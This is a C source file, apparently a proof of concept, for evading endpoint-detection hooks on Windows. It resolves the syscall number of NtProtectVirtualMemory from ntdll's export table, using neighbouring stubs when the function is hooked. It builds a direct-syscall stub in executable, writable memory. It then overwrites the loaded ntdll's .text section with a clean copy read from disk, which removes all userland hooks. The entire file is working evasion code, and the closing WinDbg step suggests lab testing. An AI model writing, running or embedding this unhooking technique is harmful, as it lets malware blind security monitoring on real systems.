#include <windows.h>
#include <stdio.h>
#include <string.h>

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)

// SSN for NtProtectVirtualMemory resolved at runtime
static DWORD SSN_NtProtect = 0;

// Executable region holding our direct syscall trampoline
static PVOID g_StubMem = NULL;

// Check if first byte is E9 (jmp) = hooked
static BOOL IsHooked(PVOID addr) {
    return *(PBYTE)addr == 0xE9;
}

// Check if stub looks like a clean NT syscall stub
// mov r10,rcx = 4C 8B D1 | mov eax = B8
static BOOL IsCleanStub(PBYTE p) {
    return p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8;
}

// Extract SSN from a clean stub (bytes 4-5 hold the syscall number)
static DWORD ExtractSSN(PVOID addr) {
    PBYTE p = (PBYTE)addr;
    if (IsCleanStub(p))
        return (DWORD)p[4] | ((DWORD)p[5] << 8);
    return (DWORD)-1;
}

// Resolve SSN via neighbor: scan EAT neighbors +- offset until clean stub
// Syscall numbers are sequential in EAT alphabetical order
static DWORD ResolveSSNByNeighbor(HMODULE hNtdll, DWORD targetNameIdx,
                                   PDWORD funcRVAs, PWORD nameOrdinals,
                                   DWORD numNames) {
    // Walk forward
    for (DWORD offset = 1; offset < 10; offset++) {
        if (targetNameIdx + offset >= numNames) break;
        PVOID neighbor = (PVOID)((PBYTE)hNtdll + funcRVAs[nameOrdinals[targetNameIdx + offset]]);
        DWORD ssn = ExtractSSN(neighbor);
        if (ssn != (DWORD)-1)
            return ssn - offset;
    }
    // Walk backward
    for (DWORD offset = 1; offset < 10; offset++) {
        if (targetNameIdx < offset) break;
        PVOID neighbor = (PVOID)((PBYTE)hNtdll + funcRVAs[nameOrdinals[targetNameIdx - offset]]);
        DWORD ssn = ExtractSSN(neighbor);
        if (ssn != (DWORD)-1)
            return ssn + offset;
    }
    return (DWORD)-1;
}

// Allocate RWX memory and write a syscall stub with the given SSN baked in
static PVOID AllocateSyscallStub(DWORD ssn) {
    BYTE tmpl[] = {
        0x4C, 0x8B, 0xD1,              // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00,  // mov eax, <ssn>
        0x0F, 0x05,                    // syscall
        0xC3                           // ret
    };

    PBYTE mem = (PBYTE)VirtualAlloc(NULL, sizeof(tmpl),
                                    MEM_COMMIT | MEM_RESERVE,
                                    PAGE_EXECUTE_READWRITE);
    if (!mem) return NULL;
    memcpy(mem, tmpl, sizeof(tmpl));
    // Patch SSN into bytes 4-7
    *(PDWORD)(mem + 4) = ssn;
    return mem;
}

// Call NtProtectVirtualMemory directly via our stub
// Uses typed function pointer to respect x64 calling convention
static NTSTATUS DirectNtProtect(PVOID stub,
                                 HANDLE hProcess,
                                 PVOID *baseAddr,
                                 PSIZE_T regionSize,
                                 DWORD  newProt,
                                 PDWORD oldProt) {
    typedef NTSTATUS (NTAPI *FnProtect)(HANDLE, PVOID*, PSIZE_T, DWORD, PDWORD);
    return ((FnProtect)stub)(hProcess, baseAddr, regionSize, newProt, oldProt);
}

// Resolve SSN for NtProtectVirtualMemory by walking the EAT
static BOOL ResolveSyscalls(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS nth = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + dos->e_lfanew);
    DWORD expRVA = nth->OptionalHeader
                       .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                       .VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY expDir =
        (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hNtdll + expRVA);

    PDWORD nameRVAs     = (PDWORD)((PBYTE)hNtdll + expDir->AddressOfNames);
    PDWORD funcRVAs     = (PDWORD)((PBYTE)hNtdll + expDir->AddressOfFunctions);
    PWORD  nameOrdinals = (PWORD) ((PBYTE)hNtdll + expDir->AddressOfNameOrdinals);
    DWORD  numNames     = expDir->NumberOfNames;

    for (DWORD i = 0; i < numNames; i++) {
        LPCSTR name = (LPCSTR)((PBYTE)hNtdll + nameRVAs[i]);
        if (strcmp(name, "NtProtectVirtualMemory") != 0) continue;

        PVOID addr = (PVOID)((PBYTE)hNtdll + funcRVAs[nameOrdinals[i]]);

        if (!IsHooked(addr))
            SSN_NtProtect = ExtractSSN(addr);
        else
            SSN_NtProtect = ResolveSSNByNeighbor(hNtdll, i,
                                                  funcRVAs, nameOrdinals,
                                                  numNames);

        printf("[*] NtProtectVirtualMemory @ %p hooked=%d SSN=0x%02lX\n",
               addr, IsHooked(addr), SSN_NtProtect);
        break;
    }

    if (SSN_NtProtect == 0 || SSN_NtProtect == (DWORD)-1) return FALSE;

    g_StubMem = AllocateSyscallStub(SSN_NtProtect);
    if (!g_StubMem) return FALSE;

    printf("[+] Syscall stub @ %p\n", g_StubMem);
    return TRUE;
}

// Read ntdll from disk, find .text section, overwrite hooked in-memory copy
BOOL RemapNtdllText(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    // Read a clean copy of ntdll straight from disk
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, 0, NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open ntdll.dll from disk: %lu\n", GetLastError());
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    PBYTE diskBuffer = (PBYTE)VirtualAlloc(NULL, fileSize,
                                            MEM_COMMIT | MEM_RESERVE,
                                            PAGE_READWRITE);
    if (!diskBuffer) {
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead = 0;
    ReadFile(hFile, diskBuffer, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    printf("[*] Read %lu bytes of ntdll.dll from disk\n", bytesRead);

    // Parse PE headers of the disk copy to find the .text section
    PIMAGE_DOS_HEADER     dos = (PIMAGE_DOS_HEADER)diskBuffer;
    PIMAGE_NT_HEADERS     nth = (PIMAGE_NT_HEADERS)(diskBuffer + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nth);

    BOOL result = FALSE;

    for (WORD i = 0; i < nth->FileHeader.NumberOfSections; i++, sec++) {
        // Match .text section by name
        if (memcmp(sec->Name, ".text", 5) != 0) continue;

        // dest = in-memory .text of the loaded (hooked) ntdll
        PVOID  dest     = (PVOID)((PBYTE)hNtdll + sec->VirtualAddress);
        // src  = .text from our clean disk copy (file offset, not RVA)
        PVOID  src      = (PVOID)(diskBuffer + sec->PointerToRawData);
        SIZE_T sectSize = (SIZE_T)sec->SizeOfRawData;
        DWORD  oldProt  = 0;

        printf("[*] .text section: disk offset=0x%lX RVA=0x%lX size=0x%lX\n",
               sec->PointerToRawData, sec->VirtualAddress, sec->SizeOfRawData);
        printf("[*] Overwriting in-memory .text @ %p with clean disk copy\n", dest);

        // Make the in-memory .text writable via direct syscall
        // We cannot use the hooked NtProtect here
        NTSTATUS st = DirectNtProtect(g_StubMem,
                                       GetCurrentProcess(),
                                       &dest, &sectSize,
                                       PAGE_EXECUTE_READWRITE,
                                       &oldProt);
        if (!NT_SUCCESS(st)) {
            printf("[-] NtProtect (make writable) failed: 0x%08lX\n", st);
            break;
        }

        // Overwrite entire .text section in one shot
        memcpy(dest, src, sectSize);

        // Restore original page protections
        st = DirectNtProtect(g_StubMem,
                              GetCurrentProcess(),
                              &dest, &sectSize,
                              oldProt, &oldProt);
        if (!NT_SUCCESS(st))
            printf("[!] NtProtect (restore) failed: 0x%08lX\n", st);

        printf("[+] .text section remapped successfully\n");
        result = TRUE;
        break;
    }

    VirtualFree(diskBuffer, 0, MEM_RELEASE);
    return result;
}

int main(void) {
    // Step 1: resolve SSN for NtProtectVirtualMemory and build direct stub
    // We need this before we can make any memory writable for the remap
    if (!ResolveSyscalls()) {
        printf("[-] Failed to resolve syscalls\n");
        return 1;
    }

    // Step 2: remap entire .text section from clean disk copy
    // This removes all hooks in one memcpy instead of patching one by one
    if (!RemapNtdllText()) {
        printf("[-] Remap failed\n");
        VirtualFree(g_StubMem, 0, MEM_RELEASE);
        return 1;
    }

    // Keep process alive to attach WinDbg and verify
    printf("[*] Sleeping 60s - attach WinDbg and run: u ntdll!NtOpenProcess\n");
    Sleep(60000);

    VirtualFree(g_StubMem, 0, MEM_RELEASE);
    return 0;
}
